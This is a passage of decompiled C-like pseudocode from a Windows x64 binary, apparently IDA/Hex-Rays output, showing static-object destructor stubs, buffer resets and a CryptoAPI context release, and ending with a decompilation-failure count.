// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400DA848: using guessed type __int64 qword_1400DA848;

//----- (00000001400A0080) ----------------------------------------------------
void __cdecl sub_1400A0080()
{
  if ( qword_1400DA7B0 )
    (**(void (__fastcall ***)(__int64, signed __int64))qword_1400DA7B0)(qword_1400DA7B0, 1i64);
  qword_1400DA7B0 = 0i64;
}
// 1400DA7B0: using guessed type __int64 qword_1400DA7B0;

//----- (00000001400A00B0) ----------------------------------------------------
void __cdecl sub_1400A00B0()
{
  if ( qword_1400DAA18 )
    (**(void (__fastcall ***)(__int64, signed __int64))qword_1400DAA18)(qword_1400DAA18, 1i64);
  qword_1400DAA18 = 0i64;
}
// 1400DAA18: using guessed type __int64 qword_1400DAA18;

//----- (00000001400A00E0) ----------------------------------------------------
void __cdecl sub_1400A00E0()
{
  if ( qword_1400DAA28 )
    (**(void (__fastcall ***)(__int64, signed __int64))qword_1400DAA28)(qword_1400DAA28, 1i64);
  qword_1400DAA28 = 0i64;
}
// 1400DAA28: using guessed type __int64 qword_1400DAA28;

//----- (00000001400A0110) ----------------------------------------------------
void __cdecl sub_1400A0110()
{
  if ( qword_1400DAA08 )
    (**(void (__fastcall ***)(__int64, signed __int64))qword_1400DAA08)(qword_1400DAA08, 1i64);
  qword_1400DAA08 = 0i64;
}
// 1400DAA08: using guessed type __int64 qword_1400DAA08;

//----- (00000001400A0140) ----------------------------------------------------
void __cdecl sub_1400A0140()
{
  void *v0; // rbx

  v0 = qword_1400DAB80;
  if ( qword_1400DAB80 )
  {
    CryptReleaseContext(*(_QWORD *)qword_1400DAB80, 0);
    operator delete(v0);
  }
  qword_1400DAB80 = 0i64;
}

//----- (00000001400A0180) ----------------------------------------------------
void __cdecl sub_1400A0180()
{
  void **v0; // rbx
  __int64 v1; // r8
  char v2; // [rsp+30h] [rbp+8h]

  v0 = (void **)qword_1400DABF8;
  if ( qword_1400DABF8 )
  {
    if ( *(_QWORD *)qword_1400DABF8 )
    {
      v1 = *((_QWORD *)qword_1400DABF8 + 1);
      nullsub_1(qword_1400DABF8);
      sub_140003CA0((__int64)&v2);
      operator delete(*v0);
      *v0 = 0i64;
      v0[1] = 0i64;
      v0[2] = 0i64;
    }
    operator delete(v0);
  }
  qword_1400DABF8 = 0i64;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);

//----- (00000001400A01F0) ----------------------------------------------------
void __cdecl sub_1400A01F0()
{
  if ( qword_1400DAC08 )
    (**(void (__fastcall ***)(__int64, signed __int64))qword_1400DAC08)(qword_1400DAC08, 1i64);
  qword_1400DAC08 = 0i64;
}
// 1400DAC08: using guessed type __int64 qword_1400DAC08;

//----- (00000001400A0220) ----------------------------------------------------
void sub_1400A0220()
{
  sub_14006BF10((__int64)&unk_1400DBD80);
}

//----- (00000001400A0230) ----------------------------------------------------
void __cdecl sub_1400A0230()
{
  void *v0; // rbx
  char v1; // [rsp+30h] [rbp+8h]

  if ( (unsigned __int64)qword_1400DBF08 >= 8 )
  {
    v0 = qword_1400DBEF0;
    sub_140003CA0((__int64)&v1);
    nullsub_1(&v1);
    sub_140003CA0((__int64)&v1);
    operator delete(v0);
  }
  qword_1400DBF08 = 7i64;
  qword_1400DBF00 = 0i64;
  LOWORD(qword_1400DBEF0) = 0;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400DBF00: using guessed type __int64 qword_1400DBF00;
// 1400DBF08: using guessed type __int64 qword_1400DBF08;

//----- (00000001400A02A0) ----------------------------------------------------
void sub_1400A02A0()
{
  sub_140079DA0((__int64)&unk_1400D80E0);
}

//----- (00000001400A02B0) ----------------------------------------------------
void __cdecl sub_1400A02B0()
{
  void *v0; // rbx
  void *v1; // rbx
  void *v2; // rbx
  void *v3; // rbx
  char v4; // [rsp+30h] [rbp+8h]

  sub_14000CA70((__int64 **)&qword_1400DC350, (__int64 *)&v4, *(_QWORD *)qword_1400DC350, (__int64)qword_1400DC350);
  v0 = qword_1400DC350;
  sub_140003CA0((__int64)&v4);
  nullsub_1(&v4);
  sub_140003CA0((__int64)&v4);
  nullsub_1(&v4);
  sub_140003CA0((__int64)&v4);
  nullsub_1(&v4);
  sub_140003CA0((__int64)&v4);
  operator delete(v0);
  if ( (unsigned __int64)qword_1400DC348 >= 0x10 )
  {
    v1 = qword_1400DC330;
    sub_140003CA0((__int64)&v4);
    nullsub_1(&v4);
    sub_140003CA0((__int64)&v4);
    operator delete(v1);
  }
  qword_1400DC348 = 15i64;
  qword_1400DC340 = 0i64;
  LOBYTE(qword_1400DC330) = 0;
  if ( (unsigned __int64)qword_1400DC328 >= 0x10 )
  {
    v2 = qword_1400DC310;
    sub_140003CA0((__int64)&v4);
    nullsub_1(&v4);
    sub_140003CA0((__int64)&v4);
    operator delete(v2);
  }
  qword_1400DC328 = 15i64;
  qword_1400DC320 = 0i64;
  LOBYTE(qword_1400DC310) = 0;
  if ( (unsigned __int64)qword_1400DC308 >= 0x10 )
  {
    v3 = qword_1400DC2F0;
    sub_140003CA0((__int64)&v4);
    nullsub_1(&v4);
    sub_140003CA0((__int64)&v4);
    operator delete(v3);
  }
  qword_1400DC308 = 15i64;
  qword_1400DC300 = 0i64;
  LOBYTE(qword_1400DC2F0) = 0;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400DC300: using guessed type __int64 qword_1400DC300;
// 1400DC308: using guessed type __int64 qword_1400DC308;
// 1400DC320: using guessed type __int64 qword_1400DC320;
// 1400DC328: using guessed type __int64 qword_1400DC328;
// 1400DC340: using guessed type __int64 qword_1400DC340;
// 1400DC348: using guessed type __int64 qword_1400DC348;

//----- (00000001400A04A0) ----------------------------------------------------
void __cdecl sub_1400A04A0()
{
  if ( qword_1400DD0A8 )
    (**(void (__fastcall ***)(__int64, signed __int64))qword_1400DD0A8)(qword_1400DD0A8, 1i64);
  if ( (_UNKNOWN *)qword_1400DD0A0 == &unk_1400DD080 )
  {
    byte_1400DD091 = 0;
    memset((void *)qword_1400DD0A0, 0, qword_1400DD098);
  }
  if ( (_UNKNOWN *)qword_1400DD078 == &unk_1400DD048 )
  {
    byte_1400DD069 = 0;
    memset((void *)qword_1400DD078, 0, qword_1400DD070);
  }
  nullsub_1(&qword_1400DD040);
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400DD040: using guessed type __int64 qword_1400DD040;
// 1400DD069: using guessed type char byte_1400DD069;
// 1400DD070: using guessed type __int64 qword_1400DD070;
// 1400DD078: using guessed type __int64 qword_1400DD078;
// 1400DD091: using guessed type char byte_1400DD091;
// 1400DD098: using guessed type __int64 qword_1400DD098;
// 1400DD0A0: using guessed type __int64 qword_1400DD0A0;
// 1400DD0A8: using guessed type __int64 qword_1400DD0A8;

//----- (00000001400A0530) ----------------------------------------------------
void __cdecl sub_1400A0530()
{
  if ( qword_1400DD128 )
    (**(void (__fastcall ***)(__int64, signed __int64))qword_1400DD128)(qword_1400DD128, 1i64);
  qword_1400DD128 = 0i64;
}
// 1400DD128: using guessed type __int64 qword_1400DD128;

//----- (00000001400A0560) ----------------------------------------------------
void __cdecl sub_1400A0560()
{
  void *v0; // rbx

  v0 = qword_1400DD678;
  if ( qword_1400DD678 )
  {
    sub_1400913B0(qword_1400DD678);
    operator delete(v0);
  }
  qword_1400DD678 = 0i64;
}

//----- (00000001400A05A0) ----------------------------------------------------
void __cdecl sub_1400A05A0()
{
  void *v0; // rbx

  v0 = qword_1400DD668;
  if ( qword_1400DD668 )
  {
    sub_1400913B0(qword_1400DD668);
    operator delete(v0);
  }
  qword_1400DD668 = 0i64;
}

#error "There were 11 decompilation failure(s) on 2806 function(s)"
